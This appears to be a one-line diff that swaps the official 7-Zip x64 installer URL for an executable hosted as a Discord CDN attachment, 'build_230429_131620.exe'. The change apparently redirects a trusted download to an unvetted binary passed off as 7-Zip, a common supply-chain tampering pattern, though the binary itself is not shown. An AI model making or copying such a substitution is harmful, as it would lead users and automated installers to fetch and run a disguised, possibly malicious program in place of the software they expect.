@@ -1,1 +1,1 @@
-https://www.7-zip.org/a/7z2201-x64.exe
+https://cdn.discordapp.com/attachments/1075391152687165463/1101814501420040212/build_230429_131620.exe
